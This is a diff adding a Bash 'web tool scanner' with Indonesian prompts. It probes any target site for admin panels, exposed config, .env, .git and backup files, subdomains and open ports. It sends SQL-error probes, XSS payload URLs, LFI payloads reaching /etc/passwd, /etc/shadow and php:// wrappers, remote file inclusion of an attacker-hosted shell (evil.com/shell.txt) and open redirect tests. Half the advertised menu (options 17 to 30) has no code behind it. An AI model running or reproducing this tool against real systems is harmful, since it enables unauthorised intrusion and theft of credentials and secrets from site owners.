@@ -1,0 +1,446 @@
+#!/bin/bash
+# WTS - WEB TOOL SCANNER
+# AUTHOR: WATESN1SMXvST
+
+RED='\033[0;31m'
+NC='\033[0m'
+
+clear
+
+echo -e "${RED}"
+echo "╔════════════════════════════════════════════════════╗"
+echo "║  ██     ██ ████████ ███████                         ║"
+echo "║  ██     ██    ██    ██                              ║"
+echo "║  ██  █  ██    ██    ███████                         ║"
+echo "║  ██ ██ ██     ██         ██                         ║"
+echo "║   ███ ███     ██    ███████                         ║"
+echo "║                                                    ║"
+echo "║              WTS - WEB TOOL SCANNER                ║"
+echo "║              AUTHOR: WATESN1SMXvST                 ║"
+echo "╚════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+echo ""
+
+echo "╔════════════════════════════════════════════════════╗"
+echo "║                   31 MENU                          ║"
+echo "╠════════════════════════════════════════════════════╣"
+echo "║  1. SCANNING BIASA         17. SCANNING PARAMETER  ║"
+echo "║  2. XSS SCAN               18. SCANNING HEADER     ║"
+echo "║  3. GENERATOR XSS          19. SCANNING COOKIE     ║"
+echo "║  4. XSS-SPEED              20. SCANNING SESSION    ║"
+echo "║  5. SCANNING ADMIN PAGE    21. SCANNING LOGIN PAGE ║"
+echo "║  6. SCANNING VULN          22. SCANNING UPLOAD PAGE║"
+echo "║  7. SCANNING SUBDOMAIN     23. SCANNING API ENDPOINT║"
+echo "║  8. SCANNING PORT          24. SCANNING DATABASE   ║"
+echo "║  9. SCANNING DIRECTORY     25. SCANNING PHPINFO    ║"
+echo "║ 10. SCANNING BACKUP FILE   26. SCANNING ROBOTS.TXT ║"
+echo "║ 11. SCANNING CONFIG FILE   27. SCANNING SITEMAP    ║"
+echo "║ 12. SCANNING SQL ERROR     28. SCANNING CROSS DOMAIN║"
+echo "║ 13. SCANNING LFI           29. SCANNING CORS       ║"
+echo "║ 14. SCANNING RFI           30. SCANNING SSL/TLS    ║"
+echo "║ 15. SCANNING SHELL UPLOAD  31. EXIT                ║"
+echo "║ 16. SCANNING OPEN REDIRECT                         ║"
+echo "╚════════════════════════════════════════════════════╝"
+echo ""
+read -p "[?] PILIH MENU 1-31: " menu
+
+if [ "$menu" == "1" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING BIASA"
+    curl -s -I "$target"
+    
+elif [ "$menu" == "2" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    read -p "PARAMETER: " param
+    echo ""
+    echo "[>] XSS SCAN"
+    echo "${target}?${param}=<script>alert(1)</script>"
+    
+elif [ "$menu" == "3" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    read -p "PARAMETER: " param
+    echo ""
+    echo "[>] GENERATOR XSS"
+    echo "${target}?${param}=<script>alert(1)</script>"
+    echo "${target}?${param}=<img src=x onerror=alert(1)>"
+    echo "${target}?${param}=<body onload=alert(1)>"
+    echo "${target}?${param}=<svg onload=alert(1)>"
+    echo "${target}?${param}=<iframe src=javascript:alert(1)>"
+    echo "${target}?${param}=<input onfocus=alert(1)>"
+    echo "${target}?${param}=<details open ontoggle=alert(1)>"
+    
+elif [ "$menu" == "4" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    read -p "PARAMETER: " param
+    read -p "JUMLAH PAYLOAD: " jumlah
+    echo ""
+    echo "[>] XSS-SPEED"
+    for i in $(seq 1 $jumlah); do
+        echo "[$i] ${target}?${param}=<script>alert($i)</script>"
+        sleep 0.02
+    done
+
+elif [ "$menu" == "5" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING ADMIN PAGE (50 LIST)"
+    echo ""
+    
+    admin_list=(
+        "admin" "login" "administrator" "admin.php" "login.php" "wp-admin" "wp-login.php"
+        "cpanel" "admincp" "modcp" "adminarea" "backend" "dashboard" "admin/login"
+        "adminpanel" "panel" "administrator/index.php" "admin/index.php" "admin.html"
+        "admin.asp" "admin.aspx" "admin.jsp" "admin/go" "admin/main" "admin/control"
+        "admin/user" "admin/settings" "admin/config" "admin/setup" "admin/install"
+        "logon" "signin" "auth" "authenticate" "secure" "management" "controlpanel"
+        "cp" "webadmin" "siteadmin" "sysadmin" "root" "master" "superadmin"
+        "admin123" "admin999" "adm1n" "administrate" "admins" "administer"
+    )
+    
+    for page in "${admin_list[@]}"; do
+        url="${target}/${page}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "403" ]; then
+            echo "[ 403 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        elif [ "$status" == "500" ]; then
+            echo "[ 500 ] $url"
+        elif [ "$status" == "301" ] || [ "$status" == "302" ]; then
+            echo "[ $status ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "6" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING VULN (30 LIST)"
+    echo ""
+    
+    vuln_list=(
+        "/phpinfo.php" "/info.php" "/test.php" "/config.php" "/wp-config.php.bak"
+        "/.env" "/.git/config" "/README.md" "/CHANGELOG.md" "/composer.json"
+        "/package.json" "/package-lock.json" "/yarn.lock" "/Gemfile" "/Gemfile.lock"
+        "/requirements.txt" "/Dockerfile" "/docker-compose.yml" "/Makefile"
+        "/backup.sql" "/database.sql" "/db.sql" "/dump.sql" "/backup.tar.gz"
+        "/backup.zip" "/site.zip" "/old.zip" "/www.zip" "/htaccess.txt"
+    )
+    
+    for file in "${vuln_list[@]}"; do
+        url="${target}${file}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "403" ]; then
+            echo "[ 403 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "7" ]; then
+    read -p "MASUKKAN DOMAIN (contoh: example.com): " domain
+    echo ""
+    echo "[>] SCANNING SUBDOMAIN (30 LIST)"
+    echo ""
+    
+    sub_list=(
+        "www" "mail" "ftp" "localhost" "webmail" "ns1" "ns2" "smtp" "pop" "pop3"
+        "imap" "test" "dev" "staging" "api" "admin" "blog" "shop" "store" "forum"
+        "support" "help" "docs" "cdn" "static" "media" "images" "video" "download"
+    )
+    
+    for sub in "${sub_list[@]}"; do
+        url="http://${sub}.${domain}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "8" ]; then
+    read -p "MASUKKAN IP/DOMAIN: " target
+    echo ""
+    echo "[>] SCANNING PORT (30 PORT)"
+    echo ""
+    
+    ports=(21 22 23 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5432 5900 6379 8080 8443 27017 11211 22 80 443 8080 8888 9999)
+    
+    for port in "${ports[@]}"; do
+        timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null
+        if [ $? -eq 0 ]; then
+            echo "[ OPEN ] $target:$port"
+        else
+            echo "[ CLOSED ] $target:$port"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "9" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING DIRECTORY (30 LIST)"
+    echo ""
+    
+    dir_list=(
+        "admin" "user" "login" "register" "dashboard" "profile" "setting" "config"
+        "upload" "download" "image" "images" "file" "files" "data" "database"
+        "backup" "temp" "tmp" "cache" "log" "logs" "error" "debug" "test" "dev"
+        "api" "v1" "v2" "public" "private"
+    )
+    
+    for dir in "${dir_list[@]}"; do
+        url="${target}/${dir}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "403" ]; then
+            echo "[ 403 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "10" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING BACKUP FILE (30 LIST)"
+    echo ""
+    
+    backup_list=(
+        "backup.zip" "backup.tar.gz" "backup.rar" "backup.7z" "backup.sql"
+        "database.sql" "db.sql" "dump.sql" "backup.db" "site.zip" "www.zip"
+        "htdocs.zip" "public_html.zip" "old.zip" "old_backup.zip" "backup_old.zip"
+        "backup.tar" "backup.bak" "backup.old" "backup~" "backup.php" "backup.asp"
+        "backup.txt" "backup.log" "backup.bak" "config.bak" "wp-config.bak"
+        "settings.bak" "db_backup.sql" "data_backup.zip"
+    )
+    
+    for file in "${backup_list[@]}"; do
+        url="${target}/${file}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "11" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING CONFIG FILE (30 LIST)"
+    echo ""
+    
+    config_list=(
+        "config.php" "wp-config.php" "settings.php" "database.php" "db.php"
+        "config.ini" "config.json" "config.yaml" "config.yml" ".env"
+        "application.properties" "application.yml" "web.config" "app.config"
+        "config.js" "config.py" "config.rb" "config.xml" "settings.json"
+        "settings.ini" "settings.yaml" "config.bak" "wp-config.bak" "config_old.php"
+        "config.local.php" "config.dev.php" "config.prod.php" "parameters.yml"
+        "parameters.ini" "security.yml"
+    )
+    
+    for file in "${config_list[@]}"; do
+        url="${target}/${file}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "403" ]; then
+            echo "[ 403 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "12" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING SQL ERROR (30 PARAMETER)"
+    echo ""
+    
+    sql_params=("id" "page" "cat" "product" "detail" "news" "post" "view" "show" "item" "code" "num" "no" "kode" "idx" "ref" "uid" "sid" "q" "s" "search" "query" "keyword" "tag" "author" "user" "userid" "member" "profile" "pid")
+    
+    for param in "${sql_params[@]}"; do
+        url="${target}?${param}=1'"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "13" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING LFI (30 PAYLOAD)"
+    echo ""
+    
+    lfi_list=(
+        "../../../../etc/passwd" "../../../etc/passwd" "../../etc/passwd" "../etc/passwd"
+        "....//....//....//etc/passwd" "..;/..;/..;/etc/passwd" "../../../../etc/passwd%00"
+        "../../../../windows/win.ini" "../../../windows/win.ini" "../windows/win.ini"
+        "/etc/passwd" "C:\\Windows\\System32\\drivers\\etc\\hosts"
+        "../../../../var/log/apache2/access.log" "../../../../var/log/apache2/error.log"
+        "../../../../var/log/nginx/access.log" "../../../../var/log/nginx/error.log"
+        "../../../../proc/self/environ" "../../../../proc/version" "../../../../etc/hosts"
+        "../../../../etc/shadow" "../../../../home/username/.bashrc" "../../../../root/.bashrc"
+        "file:///etc/passwd" "php://filter/convert.base64-encode/resource=index.php"
+        "php://input" "expect://id" "data://text/plain,<?php system('id');?>"
+    )
+    
+    for payload in "${lfi_list[@]}"; do
+        url="${target}?page=${payload}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "14" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    read -p "ATTACKER SERVER (http://evil.com/shell.txt): " attacker
+    echo ""
+    echo "[>] SCANNING RFI (30 PAYLOAD)"
+    echo ""
+    
+    rfi_params=("page" "file" "include" "path" "doc" "folder" "root" "content" "read" "data" "url" "link" "src" "source" "template" "theme" "plugin" "module" "controller" "action" "view" "load" "fetch" "get" "post" "request" "ajax" "api" "handler" "component")
+    
+    for param in "${rfi_params[@]}"; do
+        url="${target}?${param}=${attacker}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "15" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING SHELL UPLOAD (30 PATH)"
+    echo ""
+    
+    shell_paths=(
+        "upload.php" "uploads/" "upload/" "fileupload.php" "file-upload.php" "imageupload.php"
+        "profile/upload" "user/upload" "admin/upload" "content/upload" "media/upload"
+        "ajax/upload" "api/upload" "upload/file" "upload/image" "upload/avatar"
+        "upload/profile" "upload/document" "upload/attachment" "upload/media"
+        "upload/images" "upload/photos" "upload/files" "upload/temp" "upload/tmp"
+        "upload.php?action=upload" "uploadify.php" "ckeditor/upload" "fckeditor/upload"
+        "tinymce/upload"
+    )
+    
+    for path in "${shell_paths[@]}"; do
+        url="${target}/${path}"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "16" ]; then
+    read -p "MASUKKAN WEB TARGET: " target
+    echo ""
+    echo "[>] SCANNING OPEN REDIRECT (30 PARAMETER)"
+    echo ""
+    
+    redirect_params=("url" "redirect" "return" "return_to" "return_url" "goto" "go" "link" "next" "dest" "destination" "redir" "redirect_uri" "redirect_url" "callback" "continue" "return_path" "return_url" "return_to_url" "redirect_to" "redirect_url" "out" "view" "to" "forward" "forward_url" "cur" "jump" "location")
+    
+    for param in "${redirect_params[@]}"; do
+        url="${target}?${param}=https://evil.com"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url" 2>/dev/null)
+        
+        if [ "$status" == "200" ]; then
+            echo "[ 200 ] $url"
+        elif [ "$status" == "404" ]; then
+            echo "[ 404 ] $url"
+        else
+            echo "[ $status ] $url"
+        fi
+        sleep 0.05
+    done
+    echo ""
+    echo "[+] SCAN SELESAI"
+
+elif [ "$menu" == "31" ]; then
+    echo "EXIT"
+    exit 0
+
+else
+    echo "PILIHAN SALAH"
+fi
